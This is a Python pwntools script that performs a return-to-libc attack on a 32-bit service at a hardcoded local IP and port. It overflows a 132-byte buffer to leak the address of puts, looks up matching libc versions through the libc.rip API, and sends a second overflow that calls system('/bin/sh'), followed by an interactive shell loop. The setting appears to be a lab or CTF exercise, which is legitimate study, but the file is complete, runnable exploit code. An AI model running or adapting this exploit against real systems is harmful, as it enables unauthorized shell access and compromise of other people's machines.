"""
Reference material: 
https://libc.rip/
https://stacklikemind.io/ret2libc-aslr
https://github.com/niklasb/libc-database/tree/master/searchengine
https://codingvision.net/bypassing-aslr-dep-getting-shells-with-pwntools
https://nobinpegasus.github.io/blog/a-beginners-guide-to-pwntools/
https://exploit-notes.hdks.org/exploit/binary-exploitation/cheatsheet/pwntools-cheat-sheet/
https://docs.pwntools.com/en/stable/
"""


import json
import requests
from pwn import remote, u32, p32, log

# Static Configuration
CONN, PORT = '192.168.0.156', 9000
OUTPUT_LINES_BEFORE, OUTPUT_LINES_AFTER = 6, 2
BUFF_SIZE = 132
FIND_LIBC_URL = 'https://libc.rip/api/find'
LIBC_SEARCH_URL = "https://libc.rip/api/libc/"
HEADERS = {'Content-Type': 'application/json'}
PLT_PUTS, MAIN_ADDR, GOT_PUTS = 0x8048340, 0x804847b, 0x80497ac

def leak_via_puts(conn, port,puts_got_addr):
    """
    Leaks randomised libc address via puts' PLT and function's GOT.
    """
    global proc
    proc = remote(conn,port)
    payload = b'A' * BUFF_SIZE + p32(PLT_PUTS) + p32(MAIN_ADDR) + p32(puts_got_addr)
    proc.sendline(payload)
    skip_lines(proc, OUTPUT_LINES_BEFORE)
    puts_addr = u32(proc.recv(4))
    skip_lines(proc, OUTPUT_LINES_AFTER)
    log.success(f"Leaked address of puts: {hex(puts_addr)}")
    return puts_addr


def attempt_r2libc(puts_offset, system_offset, exit_offset, binsh_offset):
    """
    Executes a return-to-libc attack to invoke system('/bin/sh').
    """

    # Leak puts address to get libc base address
    puts_addr = leak_via_puts(CONN, PORT, GOT_PUTS)
    log.success(f'Leaked libc puts address: {hex(puts_addr)}')

    # Get lib base addr using puts_offset
    libc_base = puts_addr - puts_offset
    log.success(f'Calculated libc base address: {hex(libc_base)}')

    # Prepare the ROP chain payload
    system_addr = libc_base + system_offset
    exit_addr = libc_base + exit_offset
    binsh_addr = libc_base + binsh_offset
    
    # Create and send system('/bin/sh') buffer overflow payload
    payload = b'A' * BUFF_SIZE + p32(system_addr) + p32(exit_addr) + p32(binsh_addr)

    proc.sendline(payload)
    log.success("Triggered system('/bin/sh') via buffer overflow.")

    # Skip the output lines before the reverse shell
    for _ in range(OUTPUT_LINES_AFTER):
        print(proc.recv(timeout = 0.05))
    
    # Attempt to interact with the reverse shell
    return handle_reverse_shell()


def find_potential_libcs(puts_addr):
    """
    Retrieves potential libc versions matching given offsets.
    """
    data = {"symbols": {"puts": hex(puts_addr)}}
    response = requests.post(FIND_LIBC_URL, headers=HEADERS, data=json.dumps(data))
    return response.json()


def get_libc_symbol_offsets(libc_id):
    """
    Retrieves offsets for essential libc symbols: 'puts', 'system', 'exit', 'str_bin_sh'.
    """
    libc_url = f"{LIBC_SEARCH_URL}{libc_id['id']}"
    response = requests.post(libc_url, headers=HEADERS, json={"symbols": ["puts", "system", "exit", "str_bin_sh"]})
    return response.json().get('symbols', {})


def skip_lines(proc, lines):
    for _ in range(lines):
        proc.recvline(timeout=0.05)


def handle_reverse_shell():
    """
    Handles the reverse shell interaction with the process.
    """
    try:
        proc.sendline(b"whoami")
        print(proc.recv(timeout=0.1).decode('utf-8'))
        while True:
            command = input("$ ")
            proc.sendline(command.encode('utf-8'))
            print(proc.recv(timeout=0.2).decode('utf-8'))
    except EOFError:
        return 300


def main():
    # Initial leak of the puts address to identify potential libc versions
    puts_addr = leak_via_puts(CONN, PORT, GOT_PUTS)
    potential_libcs = find_potential_libcs(puts_addr)

    # Loop through each potential libc version to attempt exploitation
    for libc in potential_libcs:
        offsets = get_libc_symbol_offsets(libc)
        puts_off, system_off, exit_off, binsh_off = (int(offsets[sym], 16) for sym in ["puts", "system", "exit", "str_bin_sh"])

        # Attempt return-to-libc attack with the current libc version's offsets
        attempt_r2libc(puts_off, system_off, exit_off, binsh_off)


if __name__ == "__main__":
    main()